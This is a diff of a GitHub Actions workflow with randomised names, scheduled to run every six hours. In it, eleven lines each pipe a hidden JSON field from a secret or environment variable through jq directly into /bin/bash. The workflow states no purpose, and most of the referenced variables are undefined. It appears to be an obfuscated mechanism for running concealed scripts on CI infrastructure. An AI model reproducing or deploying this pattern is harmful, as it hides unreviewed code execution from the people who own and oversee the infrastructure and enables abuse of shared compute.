@@ -3,8 +3,9 @@ name: ailuoww
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 3/6 * * *'
-jobs:  # 3945
+    - cron: '53 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +13,17 @@ jobs:  # 3945
       - uses: actions/checkout@v4
       - name: ailuoww
         env:
-          dc30: ${{ secrets.dc30 }}
+          zibzt39615: ${{ secrets.zibzt39615 }}
         run: |
-          echo $dc30 | jq -r .qsbez810 | /bin/bash
-          echo $dj514 | jq -r .lmt2 | /bin/bash
-          echo $gdo206 | jq -r .auxop9825 | /bin/bash
-          echo $hno68 | jq -r .wxmx6 | /bin/bash
-          echo $bt7541 | jq -r .s484 | /bin/bash
-          echo $tljfr2 | jq -r .om1280 | /bin/bash
-          echo $imjgv62 | jq -r .v586 | /bin/bash
-          echo $vh449 | jq -r .juxw3626 | /bin/bash
+          echo $zibzt39615 | jq -r .p93441 | /bin/bash
+          echo $h72692 | jq -r .i19633 | /bin/bash
+          echo $us34 | jq -r .rt863 | /bin/bash
+          echo $p788 | jq -r .q8 | /bin/bash
+          echo $hfoi43 | jq -r .scsx4 | /bin/bash
+          echo $ebt6956 | jq -r .ky8 | /bin/bash
+          echo $wcl38 | jq -r .pww8215 | /bin/bash
+          echo $og1998 | jq -r .eqxfn74 | /bin/bash
+          echo $un4869 | jq -r .ugdk1 | /bin/bash
+          echo $gevwj832 | jq -r .e1084 | /bin/bash
+          echo $y723 | jq -r .py803 | /bin/bash
 
